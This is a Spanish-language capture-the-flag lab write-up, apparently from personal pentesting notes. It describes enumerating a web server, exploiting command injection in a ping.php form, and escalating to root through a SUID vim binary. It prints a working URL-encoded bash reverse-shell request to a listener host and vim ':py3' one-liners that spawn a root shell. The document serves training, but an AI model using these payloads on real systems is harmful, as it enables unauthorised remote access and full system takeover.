
### Fase de Reconocimiento y Descubrimiento (Enumeración)

#### Escaneo de Puertos (Nmap)

Realizamos un escaneo de puertos inicial con nmap para identificar los servicios activos en la máquina objetivo:

![[Pasted image 20260810221137.png]]

**Servicios identificados:**

* **Puerto 80/TCP (HTTP):** Servidor web expuesto. Ver teoría en [HTTP & HTTPS.md](<../../../Pentesting Notes/1_Enumeration/HTTP & HTTPS.md>).

***

### Enumeración Web

#### Inspección del Servidor Web (WhatWeb)

Analizamos las tecnologías y cabeceras del servidor web mediante whatweb:

![[Pasted image 20260810221206.png]]

Identificamos un servidor web Apache. Accedemos a la aplicación a través del navegador:

![[Pasted image 20260810221253.png]]

* **Hallazgo:** La web presenta una utilidad para verificar la conectividad de red mediante la herramienta `ping`. Al ingresar una dirección IP y enviar el formulario, se genera una petición GET hacia `http://172.17.0.2/ping.php?target=IP`.

#### Fuzzing de Directorios

Realizamos un proceso de fuzzing web para descartar rutas o archivos ocultos en el servidor:

![[Pasted image 20260810221831.png]]

No se identifican rutas adicionales de interés salvo respuestas de redirección estándar (código 301), por lo que centramos nuestra atención en el funcionamiento del parámetro `target` en `ping.php`.

***

### Fase de Explotación / Intrusión

#### Inyección de Comandos (Command Injection)

Interceptamos la petición con Burp Suite y probamos delimitadores de comandos del sistema operativo (como `;`, `|`, `&&`) en el parámetro `target` para evaluar si los datos de entrada se concatenan directamente en la ejecución de comandos del sistema:

![[Pasted image 20260810222150.png]]

* **Vulnerabilidad:** El servidor ejecuta el comando inyectado y refleja su salida en la respuesta web, confirmando la vulnerabilidad de **Inyección de Comandos (Command Injection)** bajo el contexto del usuario `www-data`.

#### Reverse Shell y Tratamiento de la TTY

Preparamos una petición con un payload de reverse shell en bash debidamente codificado en URL (URL-encoding) dirigida a nuestro puerto local a la escucha:

```http
GET /ping.php?target=127.0.0.1;/bin/bash%20-c%20%27/bin/bash%20-i%20%3E%26%20/dev/tcp/172.17.0.1/4242%200%3E%261%27; HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://172.17.0.2/index.html
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Recibimos la conexión inversa en nuestro listener de Netcat:

![[Pasted image 20260810222344.png]]

Realizamos el tratamiento clásico de la TTY para obtener una consola completamente interactiva y estable:

```bash
script /dev/null -c bash
# (Presionar CTRL+Z para suspender la shell)
stty raw -echo; fg
reset xterm
export TERM=xterm && export SHELL=bash
stty rows 29 columns 111
```

Obtenemos acceso como el usuario de bajos privilegios `www-data`.

***

### Escalada de Privilegios

#### Enumeración de Binarios SUID

Listamos los binarios del sistema que cuentan con el bit SUID activo:

```bash
find / -perm -4000 -type f 2>/dev/null
```

![[Pasted image 20260810223320.png]]

* **Vulnerabilidad de Configuración:** Detectamos que el binario `/usr/bin/vim.basic` tiene habilitado el bit SUID. Ver teoría en [Permissions.md](<../../../Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions.md>).

#### Explotación de SUID (vim.basic)

Dado que `vim.basic` cuenta con soporte para Python3 (`:py3`), podemos abusar de esta funcionalidad para ejecutar llamadas del sistema y spawnear una shell como superusuario.

Ejecutamos el comando de elevación de privilegios:

```bash
vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "/bin/bash")'
```

Alternativamente, forzando el modo privilegiado de bash:

```bash
vim.basic -c ':py3 import os; os.execl("/bin/bash","bash","-p")'
```

![[Pasted image 20260810223729.png]]

¡Elevamos privilegios con éxito y obtenemos una sesión interactiva como el usuario **root**!

***

### Relaciones y Conceptos

* **Teoría:** [Linux Privilege Escalation - Permissions.md](<../../../Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions.md>), [HTTP & HTTPS.md](<../../../Pentesting Notes/1_Enumeration/HTTP & HTTPS.md>)
* **Laboratorios Relacionados:** [Gotham](Gotham.md) (Comparte inyección de comandos en utilidad de ping), [WalkingDead](WalkingDead.md) (Comparte vector RCE y escalada por SUID), [Aguademayo](Aguademayo.md) (Comparte explotación de binarios SUID)
